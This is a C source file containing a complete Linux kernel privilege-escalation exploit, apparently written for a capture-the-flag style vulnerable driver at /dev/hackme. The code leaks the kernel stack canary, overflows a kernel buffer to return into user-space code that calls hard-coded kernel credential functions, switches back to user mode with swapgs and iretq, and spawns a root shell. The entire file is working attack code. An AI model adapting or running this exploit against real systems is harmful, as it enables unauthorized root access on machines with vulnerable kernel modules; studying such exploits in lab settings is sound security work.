#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>

int g_fd = 0;

uint64_t g_canary;

void leak_canary() {
    char buf[0x100] = {0};
    read(g_fd, buf, 0x100);
    g_canary = *(uint64_t*)(buf+0x80);
    printf("[*] Kernel's canary=%lx\n", g_canary);
}

uint64_t user_ss, user_cs, user_sp, user_rflags;

void save_state() {
    __asm__ (
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] State Saved");
}

void get_shell() {
    if (0 != getuid()) {
        puts("[x] Not in root privilege.");
        exit(-1);
    } else {
        puts("[-] Success!!");
        system("/bin/sh");
    }
}

uint64_t user_pc = (uint64_t)get_shell;

void escalate_privs() {
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff814c67f0;"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, 0xffffffff814c6410;"
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_pc;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

void overflow() {
    uint64_t buf[0x20] = {0};
    uint64_t retaddr = (uint64_t)escalate_privs;

    buf[16] = g_canary;
    buf[17] = 0; // rbx
    buf[18] = 0; // r12
    buf[19] = 0; // rbp
    buf[20] = retaddr;
    puts("[*] Prepared payload.");
    write(g_fd, buf, sizeof(buf));
    puts("[!] Should never reach here!");
}

int main(int argc, char** argv) {
    g_fd = open("/dev/hackme", O_RDWR);
    if (g_fd < 0) {
        perror("open failed.");
        exit(-1);
    }
    save_state();
    leak_canary();
    overflow();
    // get_shell();
    return 0;
}